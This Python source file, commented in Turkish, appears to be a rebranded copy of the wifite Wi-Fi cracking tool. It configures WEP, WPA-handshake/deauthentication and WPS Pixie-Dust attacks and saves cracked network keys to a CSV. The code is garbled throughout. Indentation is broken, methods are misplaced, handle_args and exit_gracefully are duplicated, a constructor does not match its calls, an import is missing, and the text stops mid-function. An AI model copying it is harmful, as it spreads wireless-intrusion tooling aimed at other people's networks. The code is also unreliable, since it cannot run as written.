#!/usr/bin/python

# -*- coding: utf-8 -*-

# -*- coding: utf-8 -*-

"""
    oznte

    Yazar: @ibrahimsql<ibrahimsqql@gmail.com>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
    Bu projeye katkıda bulunan herkese özel teşekkürler.
    Eğer isminizin burada yer almasını istiyorsanız, lütfen e-posta ile bana ulaşın.



    (C) 2024 ibrahimsql 
    ibrahimsql Security Güncellemeleri
    -----------------
    - Artık root olmanıza gerek yok -cracked
    - cracked.txt, cracked.csv olarak değiştirildi ve csv formatında kaydediliyor (daha okunabilir, \x00 karakterleri yok)
         - Geriye dönük uyumluluk sağlandı
    - Küresel değişkenleri yönetmek için bir çalışma yapılandırma sınıfı oluşturuldu
    - -recrack eklendi (zaten kırılmış AP'leri olası hedefler arasında gösterir, aksi takdirde gizler)
    - Güncelleyici, artık dosyaları Google Code'dan değil, GitHub'dan alıyor
    - Komut satırı argümanlarını analiz etmek için argparse kullanıldı
    - -wepca bayrağı artık CLI'den geçirildiğinde düzgün şekilde başlatılıyor
    - parse_csv, Python csv kütüphanesini kullanıyor
    -----------------


    YAPILACAKLAR:

    v1'den aynı komut satırı anahtar isimlerini geri yükle

    Cihaz zaten izleme modundaysa, macchanger'ı kontrol et ve geçerli ise kullan

     WPS
     * Reaver oturumlarını otomatik olarak yeniden başlattığını belirt
     * WPS saldırısı için gerekli süre hakkında uyarı (*saatler*)
     * Son başarılı denemeden bu yana geçen süreyi göster
     * Deneme/başarı yüzdesi ?
     * Kodu Reaver 1.4 ile uyumlu hale getir ("x" sn/deneme)

     WEP:
     * Durdurma/atlama/devam etme yeteneği (yapıldı, test edilmedi)
     * Sadece IVS paketlerini yakalama seçeneği ( --output-format ivs,csv kullanır)
       - Eski aircrack-ng'ler ile uyumlu değil.
           - Sadece "airodump-ng --output-format ivs,csv" çalıştırın, "Arayüz belirtilmedi" = çalışır
         - Kaydedilen .cap dosyalarının boyutunu azaltır

     Reaver:
          MONİTÖR AKTİVİTESİ!
          - Çalıştırırken ESSID gir (?)
       - WPS anahtar denemelerinin başladığından emin ol.
       - Eğer deneme yapılamıyorsa, saldırıyı durdur

       - Saldırı sırasında, X dakika içinde deneme yapılmazsa, saldırıyı durdur ve yazdır

       - Reaver'ın ilişkilendirememe çıktısı:
         [!] UYARI: AA:BB:CC:DD:EE:FF ile ilişkilendirilemedi (ESSID: ABCDEF)
       - X dakika boyunca ilişkilendirilemezse, saldırıyı durdur (aynı deneme yapılamadığı gibi?)

    BELKİ:
      * WPA - kırma (pyrit/cowpatty) (çok önemli değil)
      * Başlangıçta enjeksiyon testi? (komut satırı anahtarıyla atlanabilir)

"""

# ############
# KÜTÜPHANELER #
#############

import csv  # CSV dosyalarıyla çalışmak için
import os  # Dosya yönetimi işlemleri için
import time  # Zaman aralıklarını ölçmek için
import random  # Rastgele MAC adresleri oluşturmak için
import errno  # Hata numaralarını yönetmek için

from sys import argv  # Komut satırı argümanları için
from sys import stdout  # Çıktıyı ekrana yazdırmak için

from shutil import copy  # Dosya kopyalamak için

# İşlem başlatma, iletişim kurma ve sonlandırma için
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM

import re  # RegEx kullanarak SSID'leri dosya adlarına dönüştürmek için
import argparse  # Komut satırı argümanlarını ayrıştırmak için
import urllib  # Repo güncellemelerini kontrol etmek için
import abc  # Soyut temel sınıflar için

################################
# GENEL DEĞİŞKENLER #
################################

# Konsol renkleri
W = '\033[0m'  # beyaz (normal)
R = '\033[31m'  # kırmızı
G = '\033[32m'  # yeşil
O = '\033[33m'  # turuncu
B = '\033[34m'  # mavi
P = '\033[35m'  # mor
C = '\033[36m'  # cyan
GR = '\033[37m'  # gri

# /dev/null, ekran çıktılarının gösterilmemesi için programlardan çıktı gönderin.
DN = open(os.devnull, 'w')
ERRLOG = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')

def dosya_yoneticisi_kurulum():
    global DN, ERRLOG, OUTLOG
    try:
        DN = open(os.devnull, 'w')
        ERRLOG = open(os.devnull, 'w')
        OUTLOG = open(os.devnull, 'w')
    except IOError as e:
        print(f"{R}Dosya açma hatası: {e}{W}")


###################
# VERİ YAPILARI#
###################


class CapFile:
    """
AP'nin SSID'si ve BSSID'si de dahil olmak üzere erişim noktası .cap dosyasıyla ilgili verileri tutar.    """

    def __init__(self, filename, ssid, bssid):
        self.filename = filename
        self.ssid = ssid
        self.bssid = bssid


class Target:
    """
    Bir Hedefe (diğer adıyla Erişim Noktası, diğer adıyla Yönlendirici) ilişkin verileri tutar.
    """
    
    class AP:
        """
        Erişim Noktası (Access Point) bilgilerini tutar.
        """
        
        def __init__(self, bssid, power, data, channel, encryption, ssid):
            self.bssid = bssid  # Erişim noktasının BSSID'si
            self.power = power  # Sinyal gücü
            self.data = data  # Erişim noktasıyla ilgili diğer veriler
            self.channel = channel  # Kanal numarası
            self.encryption = encryption  # Şifreleme türü
            self.ssid = ssid  # SSID (Ağ adı)
            self.wps = False  # Varsayılan olarak WPS desteklenmiyor
            self.key = ''  # Şifre (boş olarak başlar)


class Client:
    """
    Bir Client (Müşteri) sınıfı burada tanımlanabilir.
    """
    # Client sınıfının içeriğini burada tanımlayın.

    """
    Bir Müşteri (Erişim Noktası/Router'a bağlı cihaz) verilerini tutar
    """

    def __init__(self, bssid, station, power):
        self.bssid = bssid  # Erişim noktasının BSSID'si
        self.station = station  # İstemci istasyonu (Cihazın MAC adresi olabilir)
        self.power = power  # Sinyal gücü


class RunConfiguration:
    """
    Bu saldırı turları için yapılandırma
    """
    def __init__(self):
        self.REVISION = 89  # Sürüm numarası
        self.PRINTED_SCANNING = False  # Tarama işleminin yazdırılma durumu

        self.TX_POWER = 0  # Kablosuz arayüz için iletim gücü, 0 varsayılan gücü kullanır

        # WPA değişkenleri
        self.WPA_DISABLE = False  # WPA el sıkışma yakalamayı atlamak için bayrak
        self.WPA_STRIP_HANDSHAKE = True  # El sıkışmayı çıkarmak için pyrit veya tshark kullan
        self.WPA_DEAUTH_COUNT = 1  # Deauthentication paketleri gönderme sayısı
        self.WPA_DEAUTH_TIMEOUT = 10  # Deauthentication patlamaları arasındaki bekleme süresi (saniye cinsinden)
        self.WPA_ATTACK_TIMEOUT = 500  # El sıkışma saldırısı için izin verilen toplam süre (saniye cinsinden)
        self.WPA_HANDSHAKE_DIR = 'hs'  # El sıkışmaların .cap dosyalarının saklandığı dizin
        # Dosya yolu ayıracısını gerekirse kaldır
        if self.WPA_HANDSHAKE_DIR != '' and self.WPA_HANDSHAKE_DIR[-1] == os.sep:
            self.WPA_HANDSHAKE_DIR = self.WPA_HANDSHAKE_DIR[:-1]

        self.WPA_FINDINGS = []  # Başarılı WPA saldırılarına dair bilgilerin bulunduğu liste
        self.WPA_DONT_CRACK = False  # El sıkışmaların kırılmasını atlamak için bayrak
        if os.path.exists('/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):
            self.WPA_DICTIONARY = '/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
        elif os.path.exists('/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):
            self.WPA_DICTIONARY = '/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
        elif os.path.exists('/usr/share/wordlists/fern-wifi/common.txt'):
            self.WPA_DICTIONARY = '/usr/share/wordlists/fern-wifi/common.txt'
        else:
            self.WPA_DICTIONARY = ''

        # Dört aşamalı el sıkışmayı kontrol ederken kullanılacak çeşitli programlar
        # True, programın geçerli bir el sıkışma bulması gerektiği anlamına gelir
        # El sıkışma bulunmaması sonucu kısaltır (Tüm 'True' programlar el sıkışmayı bulmalıdır)
        self.WPA_HANDSHAKE_TSHARK = True  # Ardışık 1,2,3 EAPOL mesaj paketlerini kontrol eder (4. paketi yoksayar)
        self.WPA_HANDSHAKE_PYRIT = False  # Bazen eksik dökümlerle çökebilir, ancak doğru.
        self.WPA_HANDSHAKE_AIRCRACK = True  # %100 doğru değil ama hızlı.
        self.WPA_HANDSHAKE_COWPATTY = False  # Daha gevşek "nonstrict mode" (-2) kullanır

        # WEP değişkenleri
        self.WEP_DISABLE = False  # WEP ağlarını görmezden gelme bayrağı
        self.WEP_PPS = 600  # Paket başına saniye (Tx hızı)
        self.WEP_TIMEOUT = 600  # Her saldırıya verilen süre
        self.WEP_ARP_REPLAY = True  # aireplay-ng aracılığıyla çeşitli WEP tabanlı saldırılar
        self.WEP_CHOPCHOP = True  # WEP ChopChop saldırısı
        self.WEP_FRAGMENT = True  # WEP Fragment saldırısı
        self.WEP_CAFFELATTE = True  # WEP Caffe Latte saldırısı
        self.WEP_P0841 = True  # WEP P0841 saldırısı
        self.WEP_HIRTE = True  # WEP HIRTE saldırısı
        self.WEP_CRACK_AT_IVS = 10000  # Kırmaya başladığımız IV sayısı
        self.WEP_IGNORE_FAKEAUTH = True  # True olduğunda, sahte kimlik doğrulama başarısızlıklarına rağmen saldırıyı devam ettirir
        self.WEP_FINDINGS = []  # Başarılı WEP saldırılarına dair bilgilerin bulunduğu liste
        self.WEP_SAVE = False  # Paketleri kaydet

        # WPS değişkenleri
        self.WPS_DISABLE = False  # WPS taramasını ve saldırılarını atlama bayrağı
        self.PIXIE = False  # Pixie saldırısını etkinleştirir
        self.WPS_FINDINGS = []  # (Başarılı) WPS saldırı sonuçlarının bulunduğu liste
        self.WPS_TIMEOUT = 660  # Başarılı PIN denemesi için bekleme süresi (saniye cinsinden)
        self.WPS_RATIO_THRESHOLD = 0.01  # İzin verilen en düşük deneme/yapılacak deneme oranı (deneme > 0)
        self.WPS_MAX_RETRIES = 0  # Tamamen vazgeçmeden önce aynı PIN’i tekrar deneme sayısı

        # Program değişkenleri
        self.SHOW_ALREADY_CRACKED = False  # Zaten kırılmış AP'leri kırma seçenekleri olarak gösterip göstermeme
        self.WIRELESS_IFACE = ''  # Kullanıcı tanımlı arayüz
        self.MONITOR_IFACE = ''  # İzleme modunda olan kullanıcı tanımlı arayüz
        self.TARGET_CHANNEL = 0  # Tarama yapılacak kullanıcı tanımlı kanal
        self.TARGET_ESSID = ''  # Saldırı hedefi olarak belirlenen kullanıcı tanımlı ESSID
        self.TARGET_BSSID = ''  # Saldırı hedefi olarak belirlenen kullanıcı tanımlı BSSID
        self.IFACE_TO_TAKE_DOWN = ''  # Oznte’ın izleme moduna aldığı arayüz
        # Saldırılardan sonra izleme modundan çıkarılması bizim görevimiz
        self.ORIGINAL_IFACE_MAC = ('', '')  # Orijinal arayüz adı[0] ve MAC adresi[1] (sahte MAC adresinden önce)
        self.DO_NOT_CHANGE_MAC = True  # MAC anonimleştiriciyi devre dışı bırakma bayrağı
        self.SEND_DEAUTHS = True # Erişim noktalarını tararken istemcilere deauthentication paketi gönderme bayrağı
        self.TARGETS_REMAINING = 0  # Saldırılacak kalan erişim noktası sayısı
        self.WPA_CAPS_TO_CRACK = []  # Kırılacak .cap dosyalarının listesi (CapFile nesneleri içerir)
        self.THIS_MAC = ''  # Arayüzün mevcut MAC adresi
        self.SHOW_MAC_IN_SCAN = False  # Hedeflerin listesinde SSID'lerin MAC adreslerini gösterme
        self.CRACKED_TARGETS = []  # Zaten kırılmış hedeflerin listesi
        self.ATTACK_ALL_TARGETS = False  # Herkese saldırmak istediğimizde kullanılan bayrak
        self.ATTACK_MIN_POWER = 0  # Hedef olarak kabul edilen erişim noktasının minimum gücü (dB cinsinden)
        self.VERBOSE_APS = True  # Erişim noktalarını görünür kılma
        self.CRACKED_TARGETS = self.load_cracked()  # Kırılmış hedefleri yükle
        old_cracked = self.load_old_cracked()  # Eski kırılmış hedefleri yükle
        if len(old_cracked) > 0:
            # Sonuçları birleştir
            for OC in old_cracked:
                new = True
                for NC in self.CRACKED_TARGETS:
                    if OC.bssid == NC.bssid:
                        new = False
                        break
                # Hedef diğer listede yoksa
                # Ekleyip diske kaydet
                if new:
                    self.save_cracked(OC)
  def ConfirmRunningAsRoot(self):
    """
    Programın kök kullanıcı olarak çalıştırıldığını doğrular.
    Eğer kök olarak çalıştırılmıyorsa, kullanıcıyı bilgilendirir ve çıkış yapar.
    """
    if os.getuid() != 0:
        # Renk kodları için kullanılacak değişkenler
        R = '\033[31m'  # Kırmızı
        O = '\033[33m'  # Turuncu
        G = '\033[32m'  # Yeşil
        W = '\033[0m'   # Normal

        print(f"{R}[!]{O} HATA: {G}wifite{O} kök olarak çalıştırılmalıdır ({R}root{W}).")
        print(f"{R}[!]{O} Kök olarak oturum açın ({W}su root{O}) veya {W}sudo ./oznte.py{W} komutunu deneyin.")
        exit(1)
    def ConfirmCorrectPlatform(self):
    """
    Programın doğru platformda çalıştırıldığını doğrular.
    Eğer program uyumlu bir platformda çalışmıyorsa, kullanıcıyı bilgilendirir ve çıkış yapar.
    """
    platform = os.uname()[0]
    if not platform.startswith("Linux") and 'Darwin' not in platform:  # OSX desteği
        # Renk kodları için kullanılacak değişkenler
        O = '\033[33m'  # Turuncu
        R = '\033[31m'  # Kırmızı
        G = '\033[32m'  # Yeşil
        W = '\033[0m'   # Normal

        print(f"{O}[!]{R} UYARI: {G}oznte{O} sadece {G}Linux{O} üzerinde çalıştırılmalıdır.")
        exit(1)
 def __init__(self):
        self.CRACKED_TARGETS = []  # Kırılmış erişim noktalarının listesi
        self.temp = ''  # Geçici dosya klasörünün yolu

    def CreateTempFolder(self):
        """
        Geçici bir klasör oluşturur ve yolunu saklar.
        Klasör yolu, işlemden sonra geçici dosyalar için kullanılacaktır.
        """
        self.temp = mkdtemp(prefix='ozn_')  # 'ozn_' öneki ile geçici klasör oluşturur
        if not self.temp.endswith(os.sep):
            self.temp += os.sep  # Klasör yolunun sonuna dosya ayırıcı ekler

        print(f"Geçici klasör oluşturuldu: {self.temp}")
    def save_cracked(self, hedef):
        """
        Kırılmış erişim noktası bilgilerini bir CSV dosyasına kaydeder.
        CSV dosyası 'kirilmis_erisime_noktalari.csv' olarak adlandırılır.
        """
        self.CRACKED_TARGETS.append(hedef)
        with open('kirilmis_erisime_noktalari.csv', 'w', newline='', encoding='utf-8') as csvfile:
            targetwriter = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            for hedef in self.CRACKED_TARGETS:
                targetwriter.writerow([hedef.bssid, hedef.encryption, hedef.ssid, hedef.key, hedef.wps])
        
        print("Kırılmış erişim noktaları başarıyla kaydedildi.")

    def load_cracked(self):
        """
        Kırılmış erişim noktaları hakkında bilgileri bir listeye yükler.
        Listeyi döndürür. Eğer dosya mevcut değilse, boş bir liste döner.
        """
        sonuc = []
        if not os.path.exists('kirilmis_erisime_noktalari.csv'):
            print("Kırılmış erişim noktaları dosyası bulunamadı.")
            return sonuc

        with open('kirilmis_erisime_noktalari.csv', 'r', encoding='utf-8') as csvfile:
            targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
            for satir in targetreader:
                if len(satir) < 5:
                    print(f"Geçersiz satır atlandı: {satir}")
                    continue
                t = Target(satir[0], 0, 0, 0, satir[1], satir[2])
                t.key = satir[3]
                t.wps = satir[4]
                sonuc.append(t)

        print(f"{len(sonuc)} kırılmış erişim noktası yüklendi.")
        return sonuc

       self.CRACKED_TARGETS = []  # Kırılmış erişim noktalarının listesi
        self.temp = ''  # Geçici dosya klasörünün yolu

    def load_old_cracked(self):
        """
        Eski kırılmış erişim noktaları hakkında bilgileri bir listeye yükler.
        Yüklenen bilgileri içeren listeyi döndürür. 
        Dosya mevcut değilse, boş bir liste döner.
        """
        sonuc = []
        dosya_yolu = 'kirilmis_erisime_noktalari.txt'
        
        if not os.path.exists(dosya_yolu):
            print(f"{dosya_yolu} dosyası bulunamadı.")
            return sonuc

        try:
            with open(dosya_yolu, 'r', encoding='utf-8') as fin:
                satirlar = fin.readlines()
        except IOError as e:
            print(f"Hata: {dosya_yolu} dosyası okunamadı. Hata detayları: {e}")
            return sonuc

        for satir in satirlar:
            # Satırı ayrıştırarak alanlara böler
            alanlar = satir.strip().split(chr(0))
            if len(alanlar) < 4:
                print(f"Geçersiz satır atlandı: {satir.strip()}")
                continue
            
            # Yeni Target nesnesi oluştur
            tar = Target(alanlar[0], '', '', '', alanlar[3], alanlar[1])
            tar.key = alanlar[2]
            
            sonuc.append(tar)
        
        print(f"{len(sonuc)} eski kırılmış erişim noktası başarıyla yüklendi.")
        return sonuc

    def exit_gracefully(self, kod=0):
        """
        Program herhangi bir noktada düzgün bir şekilde çıkış yapar.
        Geçici dosyaları ve klasörleri siler, ardından çıkış kodu ile programı sonlandırır.
        """
        # Geçici dosyaların ve klasörlerin temizlenmesi
        if os.path.exists(self.temp):
            try:
                for root, dirs, files in os.walk(self.temp, topdown=False):
                    for name in files:
                        os.remove(os.path.join(root, name))
                    for name in dirs:
                        os.rmdir(os.path.join(root, name))
                os.rmdir(self.temp)
                print(f"Geçici dosyalar ve klasör başarıyla silindi: {self.temp}")
            except Exception as e:
                print(f"Geçici dosyalar silinirken hata oluştu: {e}")

        # Programı belirli bir kod ile kapatır
        print(f"Program çıkış kodu: {kod}")
        exit(kod)
     def exit_gracefully(self, code=0):
    """
    Program düzgün bir şekilde çıkış yapar.
    Geçici dosyaları ve klasörleri temizler, eğer gerekiyorsa izleme modunu kapatır ve MAC adresini eski haline getirir.
    Verilen çıkış kodu ile programı sonlandırır.
    """
    # Geçici dosyaların ve klasörlerin temizlenmesi
    if os.path.exists(self.temp):
        try:
            # Geçici klasördeki tüm dosyaları sil
            for dosya in os.listdir(self.temp):
                dosya_yolu = os.path.join(self.temp, dosya)
                if os.path.isfile(dosya_yolu):
                    os.remove(dosya_yolu)
                elif os.path.isdir(dosya_yolu):
                    # Alt dizinleri temizle
                    for alt_dosya in os.listdir(dosya_yolu):
                        alt_dosya_yolu = os.path.join(dosya_yolu, alt_dosya)
                        os.remove(alt_dosya_yolu) if os.path.isfile(alt_dosya_yolu) else os.rmdir(alt_dosya_yolu)
                    os.rmdir(dosya_yolu)
            os.rmdir(self.temp)
            print(f"Geçici dosyalar ve klasör başarıyla silindi: {self.temp}")
        except Exception as e:
            print(f"Geçici dosyalar silinirken hata oluştu: {e}")

    # Eğer izleme modu etkinse, kapat
    if hasattr(self.RUN_ENGINE, 'disable_monitor_mode'):
        try:
            self.RUN_ENGINE.disable_monitor_mode()
            print("İzleme modu başarıyla kapatıldı.")
        except Exception as e:
            print(f"İzleme modunu kapatırken hata oluştu: {e}")

    # MAC adresini eski haline getir
    try:
        mac_change_back()
        print("MAC adresi eski haline getirildi.")
    except Exception as e:
        print(f"MAC adresini geri getirirken hata oluştu: {e}")

    # Program çıkış mesajı ve kodu
    print(f"\033[37m [+] Çıkış yapılıyor... \033[0m")  # GR + " [+]" + W + " quitting"
    print('')

    # Programı belirtilen çıkış kodu ile kapat
    exit(code)

   def handle_args(self):
    """
    Komut satırı argümanlarını işleyerek programın yapılandırmasını ayarlar.
    Kullanıcının belirttiği argümanlara göre çeşitli şifreleme ve tarama ayarlarını yapılandırır.
    """
    # Başlangıçta varsayılan ayarlar
    set_encrypt = False
    set_hscheck = False
    set_wep = False
    capfile = ''  # Analiz edilecek .cap dosyasının adı

    # Argümanları tanımla ve işle
    opt_parser = self.build_opt_parser()
    options = opt_parser.parse_args()

    # Şifreleme seçeneklerini kontrol et ve ayarla
    try:
        if not set_encrypt and (options.wpa or options.wep or options.wps):
            self.WPS_DISABLE = True
            self.WPA_DISABLE = True
            self.WEP_DISABLE = True
            set_encrypt = True
            print("\033[33m [!] Şifreleme seçenekleri devre dışı bırakıldı. Lütfen geçerli şifreleme türünü belirtin.\033[0m")
        
        # Daha önce kırılmış ağları göstermek için seçenek
        if options.recrack:
            self.SHOW_ALREADY_CRACKED = True
            print("\033[32m [+] Daha önce kırılmış ağlar da hedeflere dahil edilecek.\033[0m")
        
        # WPA şifrelemesi seçeneği
        if options.wpa:
            if options.wps:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor ve WPS taraması yapılacak.\033[0m")
            else:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor. WPS taraması yapmak için \033[36m--wps\033[0m seçeneğini kullanabilirsiniz.\033[0m")
            self.WPA_DISABLE = False
        
        # WEP şifrelemesi seçeneği
        if options.wep:
            print("\033[32m [+] WEP şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WEP_DISABLE = False

        # WPS şifrelemesi seçeneği
        if options.wps:
            print("\033[32m [+] WPS (Wi-Fi Protected Setup) şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WPS_DISABLE = False

        # Şifreleme türlerinin yapılandırılması
        if not (options.wpa or options.wep or options.wps):
            print("\033[33m [!] Uyarı: Şifreleme türü belirtilmedi. WPA, WEP veya WPS seçeneklerinden en az birini seçmelisiniz.\033[0m")
            print("\033[33m [*] Yardım için \033[36m--help\033[0m seçeneğini kullanabilirsiniz.\033[0m")

        # .cap dosyası analizi
        if options.capfile:
            capfile = options.capfile
            if os.path.isfile(capfile):
                print(f"\033[32m [+] Verilen .cap dosyası başarıyla yüklendi: {capfile}\033[0m")
            else:
                print(f"\033[31m [!] Hata: Belirtilen .cap dosyası bulunamadı: {capfile}\033[0m")
                print("\033[33m [*] Lütfen geçerli bir dosya yolu verdiğinizden emin olun.\033[0m")
                exit(1)

        # Diğer işlemler için yapılandırmalar yapılabilir
        # Örneğin: Kanal ayarları, arama aralıkları vb.

    except Exception as e:
        print(f"\033[31m [!] Hata: Komut satırı argümanları işlenirken bir hata oluştu. Hata detayları: {e}\033[0m")
        print("\033[33m [*] Lütfen geçerli argümanları kullanıp kullanmadığınızı kontrol edin ve tekrar deneyin.\033[0m")
        exit(1)

    # Yardım metinleri ve ek bilgiler
    print("\033[34m [*] Kullanım talimatları:\033[0m")
    print("\033[34m [*] --wpa: WPA şifreli ağları hedef alır.\033[0m")
    print("\033[34m [*] --wep: WEP şifreli ağları hedef alır.\033[0m")
    print("\033[34m [*] --wps: WPS şifreleme ile korunan ağları hedef alır.\033[0m")
    print("\033[34m [*] --recrack: Daha önce kırılmış ağları da hedeflere dahil eder.\033[0m")
    print("\033[34m [*] --capfile: .cap dosyasını belirtir ve analiz eder.\033[0m")
 def handle_args(self):
    """
    Komut satırı argümanlarını işleyerek programın yapılandırmasını ayarlar.
    Kullanıcının belirttiği argümanlara göre çeşitli şifreleme ve tarama ayarlarını yapılandırır.
    """
    # Başlangıçta varsayılan ayarlar
    set_encrypt = False
    set_hscheck = False
    set_wep = False
    capfile = ''  # Analiz edilecek .cap dosyasının adı

    # Argümanları tanımla ve işle
    opt_parser = self.build_opt_parser()
    options = opt_parser.parse_args()

    # Şifreleme seçeneklerini kontrol et ve ayarla
    try:
        if not set_encrypt and (options.wpa or options.wep or options.wps):
            self.WPS_DISABLE = True
            self.WPA_DISABLE = True
            self.WEP_DISABLE = True
            set_encrypt = True
            print("\033[33m [!] Şifreleme seçenekleri devre dışı bırakıldı. Lütfen geçerli şifreleme türünü belirtin.\033[0m")
        
        # Daha önce kırılmış ağları göstermek için seçenek
        if options.recrack:
            self.SHOW_ALREADY_CRACKED = True
            print("\033[32m [+] Daha önce kırılmış ağlar da hedeflere dahil edilecek.\033[0m")
        
        # WPA şifrelemesi seçeneği
        if options.wpa:
            if options.wps:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor ve WPS taraması yapılacak.\033[0m")
            else:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor. WPS taraması yapmak için \033[36m--wps\033[0m seçeneğini kullanabilirsiniz.\033[0m")
            self.WPA_DISABLE = False
        
        # WEP şifrelemesi seçeneği
        if options.wep:
            print("\033[32m [+] WEP şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WEP_DISABLE = False
        
        # WPS şifrelemesi seçeneği
        if options.wps:
            print("\033[32m [+] WPS (Wi-Fi Protected Setup) şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WPS_DISABLE = False
        
        # Pixie-Dust saldırısı seçeneği
        if options.pixie:
            print("\033[32m [+] WPS-enabled ağlar hedefleniyor ve sadece WPS Pixie-Dust saldırısı kullanılacak.\033[0m")
            self.WPS_DISABLE = False
            self.WEP_DISABLE = True
            self.PIXIE = True
        
        # Kanal seçeneği
        if options.channel:
            try:
                self.TARGET_CHANNEL = int(options.channel)
            except ValueError:
                print(f"\033[33m [!] Geçersiz kanal: \033[31m{options.channel}\033[0m")
            except IndexError:
                print("\033[33m [!] Kanal belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Kanal ayarlandı: \033[36m{self.TARGET_CHANNEL}\033[0m")
        
        # MAC adresini anonimleştirme seçeneği
        if options.mac_anon:
            print("\033[32m [+] MAC adresi anonimleştirme \033[36maktif\033[0m")
            print("\033[33m      Not: Bu seçenek sadece cihaz monitör modunda değilse çalışır!\033[0m")
            self.DO_NOT_CHANGE_MAC = False
        
        # Kablosuz arayüz seçeneği
        if options.interface:
            self.WIRELESS_IFACE = options.interface
            print(f"\033[32m [+] Kablosuz arayüz ayarlandı: \033[36m{self.WIRELESS_IFACE}\033[0m")
        
        # Monitör modunda olan arayüz seçeneği
        if options.monitor_interface:
            self.MONITOR_IFACE = options.monitor_interface
            print(f"\033[32m [+] Monitör modunda olan arayüz ayarlandı: \033[36m{self.MONITOR_IFACE}\033[0m")
        
        # Deauth işlemini kapatma seçeneği
        if options.nodeauth:
            self.SEND_DEAUTHS = False
            print("\033[32m [+] Tarama sırasında istemcileri deauthentice etmeyeceğiz.\033[0m")
        
        # ESSID seçeneği
        if options.essid:
            self.TARGET_ESSID = options.essid
            print(f"\033[32m [+] Hedef ESSID ayarlandı: \033[36m{self.TARGET_ESSID}\033[0m")

    except Exception as e:
        print(f"\033[31m [!] Hata: Komut satırı argümanları işlenirken bir hata oluştu. Hata detayları: {e}\033[0m")
        print("\033[33m [*] Lütfen geçerli argümanları kullanıp kullanmadığınızı kontrol edin ve tekrar deneyin.\033[0m")
        exit(1)

    # Kullanım talimatları ve ek bilgiler
    print("\033[34m [*] Kullanım talimatları:\033[0m")
    print("\033[34m [*] --wpa: WPA şifreli ağları hedef alır.\033[0m")
    print("\033[34m [*] --wep: WEP şifreli ağları hedef alır.\033[0m")
    print("\033[34m [*] --wps: WPS şifreleme ile korunan ağları hedef alır.\033[0m")
    print("\033[34m [*] --recrack: Daha önce kırılmış ağları da hedeflere dahil eder.\033[0m")
    print("\033[34m [*] --capfile: .cap dosyasını belirtir ve analiz eder.\033[0m")
    print("\033[34m [*] --pixie: Sadece WPS Pixie-Dust saldırısını kullanır.\033[0m")
    print("\033[34m [*] --channel: Taranacak kanalı belirtir.\033[0m")
    print("\033[34m [*] --mac_anon: MAC adresinin anonimleştirilmesini sağlar.\033[0m")
    print("\033[34m [*] --interface: Kullanılacak kablosuz arayüzü belirtir.\033[0m")
    print("\033[34m [*] --monitor_interface: Monitör modunda olan arayüzü belirtir.\033[0m")
    print("\033[34m [*] --nodeauth: Tarama sırasında istemcileri deauthentice etmeyi kapatır.\033[0m")
    print("\033[34m [*] --essid: Hedef ESSID'yi belirtir.\033[0m")
def handle_args(self):
    """
    Komut satırı argümanlarını işleyerek programın yapılandırmasını ayarlar.
    Kullanıcının belirttiği argümanlara göre çeşitli şifreleme ve tarama ayarlarını yapılandırır.
    """
    # Varsayılan ayarlar
    set_encrypt = False
    set_hscheck = False
    set_wep = False
    capfile = ''  # Analiz edilecek .cap dosyasının adı

    # Argümanları tanımla ve işle
    opt_parser = self.build_opt_parser()
    options = opt_parser.parse_args()

    try:
        # Şifreleme seçeneklerini kontrol et ve ayarla
        if not set_encrypt and (options.wpa or options.wep or options.wps):
            self.WPS_DISABLE = True
            self.WPA_DISABLE = True
            self.WEP_DISABLE = True
            set_encrypt = True
            print("\033[33m [!] Şifreleme seçenekleri devre dışı bırakıldı. Lütfen geçerli şifreleme türünü belirtin.\033[0m")
        
        # Daha önce kırılmış ağları göstermek için seçenek
        if options.recrack:
            self.SHOW_ALREADY_CRACKED = True
            print("\033[32m [+] Daha önce kırılmış ağlar da hedeflere dahil edilecek.\033[0m")
        
        # WPA şifrelemesi seçeneği
        if options.wpa:
            if options.wps:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor ve WPS taraması yapılacak.\033[0m")
            else:
                print("\033[32m [+] WPA şifrelemesi ile korunan ağlar hedefleniyor. WPS taraması yapmak için \033[36m--wps\033[0m seçeneğini kullanabilirsiniz.\033[0m")
            self.WPA_DISABLE = False
        
        # WEP şifrelemesi seçeneği
        if options.wep:
            print("\033[32m [+] WEP şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WEP_DISABLE = False
        
        # WPS şifrelemesi seçeneği
        if options.wps:
            print("\033[32m [+] WPS (Wi-Fi Protected Setup) şifrelemesi ile korunan ağlar hedefleniyor.\033[0m")
            self.WPS_DISABLE = False
        
        # Pixie-Dust saldırısı seçeneği
        if options.pixie:
            print("\033[32m [+] WPS-enabled ağlar hedefleniyor ve sadece WPS Pixie-Dust saldırısı kullanılacak.\033[0m")
            self.WPS_DISABLE = False
            self.WEP_DISABLE = True
            self.PIXIE = True
        
        # Kanal seçeneği
        if options.channel:
            try:
                self.TARGET_CHANNEL = int(options.channel)
            except ValueError:
                print(f"\033[33m [!] Geçersiz kanal: \033[31m{options.channel}\033[0m")
            except IndexError:
                print("\033[33m [!] Kanal belirtilmedi!\033[0m")
            else:
                print(f"\033[32m [+] Kanal ayarlandı: \033[36m{self.TARGET_CHANNEL}\033[0m")
        
        # MAC adresini anonimleştirme seçeneği
        if options.mac_anon:
            print("\033[32m [+] MAC adresi anonimleştirme \033[36maktif\033[0m")
